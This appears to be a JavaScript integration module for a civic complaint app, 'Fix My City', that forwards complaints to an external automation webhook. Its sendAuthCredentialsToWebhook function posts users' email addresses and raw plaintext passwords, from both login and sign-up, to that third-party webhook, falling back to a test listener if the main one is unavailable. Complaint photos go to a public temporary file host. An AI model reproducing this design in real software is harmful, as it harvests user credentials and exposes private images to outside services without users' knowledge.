/**
 * Fix My City - SNS Workbench Webhook Integration Service
 * Primary Endpoint: https://api.agents.snsihub.ai/webhook/ac9a4721-bb61-4adb-8e14-4bd357cff858
 * Test Endpoint:    https://api.agents.snsihub.ai/webhook-test/ac9a4721-bb61-4adb-8e14-4bd357cff858
 */

export const DEFAULT_WEBHOOK_URL = 'https://api.agents.snsihub.ai/webhook/ac9a4721-bb61-4adb-8e14-4bd357cff858';
export const TEST_WEBHOOK_URL = 'https://api.agents.snsihub.ai/webhook-test/ac9a4721-bb61-4adb-8e14-4bd357cff858';

const STORAGE_KEY_WEBHOOK_CONFIG = 'fmc_webhook_config';

export function getWebhookConfig() {
  try {
    const saved = localStorage.getItem(STORAGE_KEY_WEBHOOK_CONFIG);
    if (saved) {
      const parsed = JSON.parse(saved);
      // Auto-migrate if pointing to old default webhook ID
      if (parsed?.url && parsed.url.includes('3c4473e9-1031-48f3-aa85-ff94a756e06b')) {
        parsed.url = DEFAULT_WEBHOOK_URL;
        localStorage.setItem(STORAGE_KEY_WEBHOOK_CONFIG, JSON.stringify(parsed));
      }
      return parsed;
    }
  } catch (e) {
    console.error('Failed to parse webhook config from localStorage:', e);
  }
  return {
    url: DEFAULT_WEBHOOK_URL,
    allowFallbackLocal: true,
    timeoutMs: 15000,
    autoTestFallback: true
  };
}

export function saveWebhookConfig(config) {
  try {
    localStorage.setItem(STORAGE_KEY_WEBHOOK_CONFIG, JSON.stringify(config));
  } catch (e) {
    console.error('Failed to save webhook config to localStorage:', e);
  }
}

/**
 * Upload an image (base64 data URL, Blob, or File) to an accessible public storage location
 * Returns the direct publicly-accessible image URL, or null if no image was provided or upload failed
 */
export async function uploadImageToStorage(imageDataOrFile) {
  if (!imageDataOrFile) return null;

  // If already a remote URL (http/https), return it directly
  if (typeof imageDataOrFile === 'string' && (imageDataOrFile.startsWith('http://') || imageDataOrFile.startsWith('https://'))) {
    return imageDataOrFile;
  }

  try {
    let fileBlob;
    let filename = `fmc-complaint-${Date.now()}.jpg`;

    if (typeof imageDataOrFile === 'string' && imageDataOrFile.startsWith('data:')) {
      // Parse base64 data URL to Blob
      const parts = imageDataOrFile.split(',');
      const mimeMatch = parts[0].match(/:(.*?);/);
      const mime = mimeMatch ? mimeMatch[1] : 'image/jpeg';
      const bstr = atob(parts[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      fileBlob = new Blob([u8arr], { type: mime });
      const ext = mime.split('/')[1] || 'jpg';
      filename = `fmc-complaint-${Date.now()}.${ext}`;
    } else if (imageDataOrFile instanceof Blob || (typeof File !== 'undefined' && imageDataOrFile instanceof File)) {
      fileBlob = imageDataOrFile;
      if (imageDataOrFile.name) filename = imageDataOrFile.name;
    } else {
      return null;
    }

    const formData = new FormData();
    formData.append('file', fileBlob, filename);

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 12000);

    const response = await fetch('https://tmpfiles.org/api/v1/upload', {
      method: 'POST',
      body: formData,
      signal: controller.signal
    });

    clearTimeout(timeoutId);

    if (response.ok) {
      const result = await response.json();
      if (result?.data?.url) {
        // Convert to direct download/render URL
        // e.g. https://tmpfiles.org/12345/image.jpg -> https://tmpfiles.org/dl/12345/image.jpg
        return result.data.url.replace('tmpfiles.org/', 'tmpfiles.org/dl/');
      }
    }
  } catch (err) {
    console.warn('Image storage upload notice:', err);
  }

  return null;
}

/**
 * Format complaint payload according to SNS Workbench specifications:
 * Structure:
 * {
 *   "name": "User's name",
 *   "location": "User's location",
 *   "email": "User's email",
 *   "image": "Image URL or null",
 *   "complaint": "Complaint description",
 *   "queries_and_requests": "Additional queries or requests",
 *   "submitted_at": "Submission timestamp"
 * }
 */
export function buildComplaintPayload({
  name,
  location,
  email,
  image,
  complaint,
  queries_and_requests,
  submitted_at
}) {
  return {
    name: name?.trim() || '',
    location: location?.trim() || '',
    email: email?.trim().toLowerCase() || '',
    image: image || null,
    complaint: complaint?.trim() || '',
    queries_and_requests: queries_and_requests?.trim() || null,
    submitted_at: submitted_at || new Date().toISOString()
  };
}

/**
 * Sends authentication credentials to the SNS Workbench Webhook
 */
export async function sendAuthCredentialsToWebhook({
  email,
  password,
  isNewAccount = false,
  action = null,
  name = '',
  location = ''
}) {
  const config = getWebhookConfig();
  const primaryUrl = config.url || DEFAULT_WEBHOOK_URL;

  const eventLabel = isNewAccount ? 'new account' : 'login';

  const payload = {
    email: email ? email.trim().toLowerCase() : '',
    password: password || '',
    account_type: eventLabel,
    auth_event: eventLabel,
    type: eventLabel,
    action: action || eventLabel,
    is_new_account: Boolean(isNewAccount),
    description: isNewAccount
      ? 'New civilian account registered'
      : 'Existing civilian account login',
    name: name?.trim() || '',
    location: location?.trim() || '',
    submitted_at: new Date().toISOString()
  };

  return await dispatchToWebhookWithFallback(primaryUrl, payload);
}

/**
 * Core HTTP dispatcher with automatic fallback to test-webhook if primary workflow is in test mode
 */
async function dispatchToWebhookWithFallback(targetUrl, payload) {
  // First attempt on targetUrl
  const result = await postJson(targetUrl, payload);
  if (result.success) {
    return result;
  }

  // If targetUrl returned 404 (Workflow inactive / test listener mode) and targetUrl is the production endpoint,
  // try the /webhook-test/ variant so active test sessions in SNS Workbench UI capture the request!
  if (result.status === 404 && targetUrl.includes('/webhook/')) {
    const testUrl = targetUrl.replace('/webhook/', '/webhook-test/');
    const testResult = await postJson(testUrl, payload);
    if (testResult.success) {
      return {
        ...testResult,
        capturedByTestListener: true,
        note: 'Captured by active SNS Workbench test listener (/webhook-test/)'
      };
    }
  }

  return result;
}

/**
 * Single HTTP POST fetch helper
 */
async function postJson(url, payload) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 12000);

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*'
      },
      body: JSON.stringify(payload),
      signal: controller.signal
    });

    clearTimeout(timeoutId);

    let responseData = null;
    const contentType = response.headers.get('content-type') || '';
    if (contentType.includes('application/json')) {
      try {
        responseData = await response.json();
      } catch (err) {
        responseData = { text: 'Unable to parse JSON response' };
      }
    } else {
      const text = await response.text();
      responseData = { text };
    }

    if (!response.ok) {
      let errorMessage = `HTTP ${response.status} (${response.statusText || 'Error'})`;
      if (responseData?.error) {
        errorMessage = responseData.error;
      } else if (responseData?.message) {
        errorMessage = responseData.message;
      }

      const isInactiveWorkflow = response.status === 404 && (
        errorMessage.includes('Workflow inactive') || 
        errorMessage.includes('Webhook not found') ||
        responseData?.debug?.received
      );

      return {
        success: false,
        status: response.status,
        error: errorMessage,
        rawResponse: responseData,
        isInactiveWorkflow,
        targetUrl: url,
        payload
      };
    }

    return {
      success: true,
      status: response.status,
      data: responseData,
      targetUrl: url,
      payload
    };
  } catch (error) {
    clearTimeout(timeoutId);

    let errorDetail = error.message || 'Network request failed';
    if (error.name === 'AbortError') {
      errorDetail = 'Request timed out after 12 seconds.';
    }

    return {
      success: false,
      status: 0,
      error: errorDetail,
      targetUrl: url,
      payload,
      isNetworkError: true
    };
  }
}

/**
 * Sends complaint to the configured SNS Workbench Webhook
 */
export async function submitComplaintToWebhook(payload, customUrl = null) {
  const config = getWebhookConfig();
  const targetUrl = customUrl || config.url || DEFAULT_WEBHOOK_URL;
  return await dispatchToWebhookWithFallback(targetUrl, payload);
}

/**
 * Diagnostic ping to test webhook connectivity
 */
export async function testWebhookHealth(url = null) {
  const config = getWebhookConfig();
  const targetUrl = url || config.url || DEFAULT_WEBHOOK_URL;

  try {
    const res = await dispatchToWebhookWithFallback(targetUrl, {
      name: "Citizen Diagnostic Test",
      location: "Central Ward Operations",
      email: "diagnostic@fixmycity.org",
      image: null,
      complaint: "Automated diagnostic test ping verifying webhook connectivity to SNS Workbench",
      queries_and_requests: "Diagnostic health verification",
      submitted_at: new Date().toISOString()
    });

    return res;
  } catch (e) {
    return {
      success: false,
      error: e.message || 'Diagnostic ping failed'
    };
  }
}
